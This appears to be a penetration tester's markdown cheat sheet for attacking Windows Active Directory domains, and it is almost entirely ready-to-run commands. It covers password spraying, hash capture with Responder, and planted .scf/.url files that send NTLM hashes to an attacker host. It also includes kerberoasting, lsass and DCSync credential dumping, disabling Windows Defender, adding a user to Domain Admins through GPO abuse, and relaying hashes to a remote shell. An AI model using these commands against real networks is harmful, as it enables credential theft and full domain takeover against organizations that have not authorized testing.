## Enumeration
* _attempt DNS zone transfer_
```
nslookup
set type=any
ls -d {domain.local}
```
* [PingCastle](https://pingcastle.com) _Use to find common active directory vulnerabilities and misconfigurations_
* `adcollector.exe` _enumerate interseting info from active directory domain_
* `Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -Properties 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime' | select dnshostname,ms-mcs-admpwd` _Try to fetch LAPS passwords from active directory if permissions aren't properly configured_
* [bloodhound](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/) _Use to map a path to domain admin.  [unofficial docker image](https://github.com/belane/docker-bloodhound)_
* _active directory and group policy snapins can be used by any domain user if they are installed_
* `crackmapexec smb {ip range} -u {username} -p {password}` _scan an ip or range with valid creds to see where it's an admin or at least a valid user_
* `crackmapexec smb {ip range} -u {username} -p {password} --shares` _enumerate shares that user has access to_
* `SharpShares.exe shares` _enumerate readable shares that user has access to_
* [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares) _tool to enumerate shares that user has access to_
* `/usr/share/responder/tools/RunFinger.py -i {ip/mask}` _scan for machines with smb signing off so hashes can be passed instead of cracked_
* `crackmapexec smb {ip range} -u {username} -H {hash} --local-auth` _Check an ip range for access using a local admin account and its uncracked hash.  SMB singing must be disabled on the target_

## Getting Creds
* `findstr /S /I cpassword \\{domain}\sysvol\{domain}\policies\*.xml` _check group policy for passwords that can be easily decrypted_
* `reg add HKCU\Console /f /v VirtualTerminalLevel /t reg_dword /d 1` _fix console colors for crackmap exec_
* `crackmapexec smb {ip} -u {users.txt} -p {password}` _spray all user accounts in users.txt with a single popular password_
* `crackmapexec smb {ip} -u {users.txt} -p {password} --local-auth` _password spray for local accounts_
* `rubeus.exe brute /password:{password} /outfile:{file.txt}` _password spray all domain accounts with one password using rubeus_
* `crackmapexec smb {domain controller} -u {username} -p {password}` _check that domain credentials are valid by attempting to login_
* `crackmapexec smb {domain controller} -u {username} -H {hash}` _check that domain credentials are valid by attempting to pass hash_
* `responder -I eth0 -wrf` _Start responder on eth0. Listen for netbios, and wpad_
* `inveigh.exe -nbns y -llmnr y -mdns y` _capture hashes on network with inveigh_
* _Example index.scf file that can force any machine that views a share to send hash to attackers responder_
```
[Shell]
Command=1
IconFile=\\{attacker ip}\whatever.ico
[Taskbar]
Command=ToggleDesktop
```
* _Example .url file that when clicked will send hash to attackers responder_
```
[InternetShortcut]
URL=file://{attacker ip}/@whatever
```
* `smbclient \\\\{ip}\\{share name} -U {domain}/{user}` _connect to smb share with valid creds_
* `put /{path}/index.scf ./index.scf` _upload malicous scf file to root of connected smb share_
* `rubeus.exe kerberoast /simple /outfile:kerberoast.txt`  _[kerberoast](https://room362.com/post/2016/kerberoast-pt1/) stealing crackable tickets from AD using kerberoasting. htb machine [Active](https://0xrick.github.io/hack-the-box/active/) is an example of this_
* _alternative kerberoast method_
```
Import-Module powerview.ps1
Invoke-Kerberoast -OutputFormat {hashcat/john} | Select-Object -ExpandProperty hash
```
* `rubeus.exe asreproast /format:{hashcat/john} /nowrap /outfile:asreproast.txt` _stealing crackable tickets from AD using asreproasting for any accounts that dont require kerberos preauth_
* `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump “<lsass pid> lsass.dmp full”` _Dump the lsass process to a file so it can be transfered to attacked for mimikatz.  Useful after forcing clear text lsass creds.  See tutorial page_
* [lsassy](https://github.com/Hackndo/lsassy) _Remotely dump secrets from lsass process_

## Privilege Escalation
* `Set-MpPreference -DisableRealtimeMonitoring $true` _disable windows defender realtime monitoring_
* `SharpGPOAbuse.exe --addcomputertask --taskname "{any task name}" --author "{any author name}" --command "cmd.exe" --arguments "/c net group \"Domain Admins\" {uesr to add} /ADD /DOMAIN" --gponame {name of vulnerable GPO}` _If a user has write privs to a GPO use it to run a command on computers that GPO applies to under their security context. Can take 90 minutes for GPO refresh_ 
* _Spawn a cmd process as another user with their hashed password. Then other tools like dsa.msc can be spawned from the cmd shell_
```
mimikatz.exe
privilege::debug
sekurlsa::pth /user:{user} /domain:{AD domain} /ntlm:{hash}
```
* `crackmapexec.exe smb {machine name} -u {user} -p {password} --local-auth -M wdigest -o ACTION=enable` _Remotely enable wdigest flag on machine.  Forces storing passwords in plain text so can dump later. Use local admin creds. Can be done by passing hash as well with -H instead of -p_
* `crackmapexec.exe smb {machine name} -u {user} -p {password} -M wdigest -o ACTION=enable` _Remotely enable wdigest flag on machine.  Forces storing passwords in plain text so can dump later. Use domain creds.  Can be done by passing hash as well with -H instead of -p_
* _Connect to another host with powershell remoting.  useful for dumping hashes etc with local admin_ 
```
winrm set winrm/config/client @{TrustedHosts="remote computer name"}
Enter-PSSession -ComputerName {remote computer name} -Credential {domain or computername\username}
```
* `procdump64.exe --accepteula -ma lsass.exe dump.dmp` _Dump lsass memory with procdump.  Will contain password hashes, or clear text if using wdigest flag_
* `pypykatz.exe lsa minidump dump.dmp` _Extract creds from lsass dump.  Should be done on attacker machine_

## Remote Commands
* `crackmapexec smb {ip range} -u {username} -p {password} -x {cmd}`  _run command on remote machine using valid creds_
* `/usr/share/responder/tools/MultiRelay.py -t {ip} -u ALL` _Responder must be running with smb and http off.  This will listen for admin hashes and try to relay them to the specified ip to spawn a remote shell.  SMB signing must be disabled on the target [some instructions here](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)_

## Persistance
* _Remotely dump all AD creds after obtaining domain admin. Hashes can be cracked or passed_
```
mimikatz
privilege::debug
log hashes.csv
lsadump::dcsync /domain:{AD domain name} /all
```
*  _Powershell to cleanup mimikatz dump for cracking_
```
Import-CSV -Delimiter "`t" -Header @("id","user","hash") -path .\hashes.csv | select user,hash | where-object {$.user -ne $null} | convertto-csv -Delimiter ':' -NoTypeInformation | % { $ -replace '"', ""} | select-string -pattern "$" -notmatch |select-object -skip 1| out-file crackme.csv -Encoding ascii
```